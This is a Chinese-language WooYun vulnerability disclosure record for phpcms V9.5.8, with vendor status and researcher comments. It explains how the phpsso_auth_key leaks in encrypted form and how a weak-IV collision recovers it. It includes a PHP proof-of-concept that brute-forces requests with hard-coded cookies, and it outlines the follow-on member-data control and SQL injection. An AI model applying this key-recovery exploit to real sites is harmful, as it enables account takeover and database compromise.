{"id": 45085, "wybug_id": "wooyun-2015-091314", "wybug_title": "phpcmsV9.5.8 设计缺陷可获取phpsso_auth_key（可用于sql注入等）", "wybug_corp": "phpcms", "wybug_author": "roker", "wybug_date": "2015-01-12 10:37", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-17：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： rt 详细说明：  @索马里的海贼 @Map向前辈致敬。:)-----------------------------------------------------------------------------------------回顾前两个漏洞， WooYun: PHPCMS V9 一个为所欲为的漏洞  WooYun: phpcms最新版绕过全局防御暴力注入（官网演示） 皆是由于 密钥 的泄露所造成的。 第一个漏洞 直接输出了phpsso_auth_key。第二个则是 输出了加密了的auth_key ，然后根据算法弱IV的缺陷进行了还原。这次的漏洞则是 泄露了 加密了的phpsso_auth_key。----------------------------------------------------------------------------------------/phpcms/modules/member/index.php\npublic function account_manage_avatar() {\t\t$memberinfo = $this->memberinfo;\t\t//初始化phpsso\t\t$phpsso_api_url = $this->_init_phpsso();\t\t$ps_auth_key = pc_base::load_config('system', 'phpsso_auth_key');\t\t$auth_data = $this->client->auth_data(array('uid'=>$this->memberinfo['phpssouid'], 'ps_auth_key'=>$ps_auth_key), '', $ps_auth_key);  //传入了 phpsso_auth_key\t\t$upurl = base64_encode($phpsso_api_url.'/index.php?m=phpsso&c=index&a=uploadavatar&auth_data='.$auth_data);  \t\t//获取头像数组\t\t$avatar = $this->client->ps_getavatar($this->memberinfo['phpssouid']);\t\t\t\tinclude template('member', 'account_manage_avatar');\t}\n继续跟到auth_data/phpcms/modules/member/classes/client.class.php\npublic function auth_data($data) {\t\t$s = $sep = '';\t\tforeach($data as $k => $v) {\t\t\tif(is_array($v)) {\t\t\t\t$s2 = $sep2 = '';\t\t\t\tforeach($v as $k2 => $v2) {\t\t\t\t\t\t$s2 .= \"$sep2{$k}[$k2]=\".$this->_ps_stripslashes($v2);\t\t\t\t\t$sep2 = '&';\t\t\t\t}\t\t\t\t$s .= $sep.$s2;\t\t\t} else {\t\t\t\t$s .= \"$sep$k=\".$this->_ps_stripslashes($v);\t\t\t}\t\t\t$sep = '&';\t\t}\t\t$auth_s = 'v='.$this->ps_vsersion.'&appid='.APPID.'&data='.urlencode($this->sys_auth($s));\t\treturn $auth_s;\t}\n将 uid=x&ps_auth_key=phpsso_auth_key 这串数据 加密后 通过模板输出了。访问 http://localhost/index.php?m=member&c=index&a=account_manage_avatar&t=1\n\nbase64解码后\n\ndata=后面的字符串即为 \nuid=x&ps_auth_key=phpsso_auth_key\n通过$this->sys_auth所加密后的数据。而在 /phpcms/modules/member/classes/client.class.php 中的sys_auth 其默认key 为 phpsso_auth_key。我们再找一处 已知明文的用 phpsso_auth_key 这个密钥所加密的数据。由于弱iv可碰撞，我们就可以得到 phpsso_auth_key 的值。在前台登入时，phpcms会向 api/phpsso.php 发送会员数据 用以支持 单点登录。而这个数据正是由phpsso_auth_key 这个密钥所加密的。在登入时抓包 \n\n\napi.php?op=phpsso&time=1421015883&code=84dfA1QJAgkCUgkCUQZVBgJQUANTCFBQUwIKUlFQWkdRCg8OF0BcVV0FUFxHQ0QHQlgDWgcFQhQNAAQCREFYQEsSDkEABBRNWw9cD1ACBVMAB1cPWgtcVQAC\ncode 后面的 密文所对应的明文格式为 \naction=synlogin&username=&uid=x&password=&time=time()\ntime() 就在 我们抓的包里的 time参数所对应的值 ,uid 在我们的会员头像的路径中可以看到\n\n与 WooYun: phpcms最新版绕过全局防御暴力注入（官网演示） 的原理一样，多登入几次，获取足够的code。\n<?php$url = \"http://localhost/index.php?m=member&c=index&a=account_manage_avatar&t=1\";$txt = '#\"(.*?)&callback#';$t=strlen($url)-54+83;$code  = array('bc9d','4213','91ed','452c','7499','19c8','d548','e399','84df','f451');$i=0;for(;;){\t$data = doGet($url);\tpreg_match_all($txt, $data, $txts);\t    $txts = substr(base64_decode($txts[1][0]),$t);\tif (in_array(substr($txts,0,4), $code)){\t\tdie($txts);\t}\t$i++;\techo $i.\"--\".substr($txts,0,4).\"\\n\";}\tfunction doGet($url){\t$ch = curl_init(); \tcurl_setopt($ch, CURLOPT_URL, $url);$header[]= 'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, text/html, * '. '/* ';  $header[]= 'Accept-Language: zh-cn ';  $header[]= 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 ';  $header[]= 'Host: localhost';  $header[]= 'Connection: Keep-Alive ';  $header[]= 'Cookie: PHPSESSID=2dl8157fhsorqc8s75m2tos2e7; drcvo_auth=005bAgUDVQJUUwUJAQUCUVYGUwFWAVIGAwYFCVFSVQQFIzBncmY0YyUhY2B2ZQYrYHUlEHBoJ3J3b2ZlcmJ2YWA0IFF2USN7JSJkfHxmNwJxdRQHZGgReWZiAVN9YmZTayUKdFdyAmMqNXRsdWYnKHFhJSp0ZgEDAAJS; drcvo__userid=1752UgdVVgBSCQcHUgMCVQtfVlFYC1oGUl5YAFYCV1RWVA; drcvo__username=b5f1BgQFBlZVVlRWBVIFAF8HVAQCUVQBVQAFWVUHUVhRVgRUAVMH; drcvo__groupid=db1fUwEFUwUICFNRAwEEV1BaVFEBDQBXU1ZQB1IDVgRXUA; drcvo__nickname=758aBwVRCARRBVFUAQBRAgJTBl1VCgwDBVBWVFlZU1IBVFlW';  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch,CURLOPT_HTTPHEADER,$header);   \t$response = curl_exec($ch);\tcurl_close($ch);\treturn $response;}?>\n需注意的是 User-Agent 和 cookie 不要填错了。\n\n找到 code为7499开头的 \n\n填入poc(注意time 和 uid)\n\n得到 ce8e83e7d1g15d1b01f46d<fa492cdefce8e83e7d157ae10c7ff468a4792cdefce8e83e7d157ae10c7f分段得\nce8e83e7d1g15d1b01f46d<fa492cdefce8e83e7d157ae10c7ff468a4792cdefce8e83e7d157ae10c7f\n中间那个即为 keyd了，接下来就是解密 phpsso_auth_key 了\n\n去掉后四位就是 phpsso_auth_key 了。拿到phpsso_auth_key 后能做的事情太多了，在api/phpsso.php这个文件里面 我们控制 action的值 就能操作全站的会员数据。当然 也可以注入。修改cookie并访问。\n\n   漏洞证明：  \n\n   修复方案：  你们更专业   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 2015-01-19：擦。谁给忽略了？太不地道了  ", "replys": "漏洞评价：\n评论\n     2015-01-12 10:40 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  大表哥，你又任性了！    \n     2015-01-12 10:48 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  mark    \n     2015-01-12 10:55 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  给爷爷跪了    \n     2015-01-12 10:57 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  目测phpcms又被人开始刷了。    \n     2015-01-12 11:02 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个好给力的样子啊，分析的不错    \n     2015-01-12 11:06 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @疯狗 那能加个精华么。。羞射~    \n     2015-01-12 11:06 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  前排    \n     2015-01-12 11:50 |    \t\tvleugel \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 无)\t\t \n  目测忽略    \n     2015-01-12 17:13 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n  不知道拿到key有什么用处呢    \n     2015-01-15 16:03 |    \t\t冉冉升起 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | ...)\t\t \n  @roker 膜拜！    \n     2015-01-18 17:43 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @疯狗 狗哥，这个能补Rank么 -。-    \n     2015-02-04 18:07 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @roker rank已补，稍后奖金送到~    \n     2015-02-04 19:43 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @疯狗 么么哒~！狗哥我要给你生猴子    \n     2015-02-07 18:19 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n   经测试0day不能用只有key下没有下划线或者别的符号才能用    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}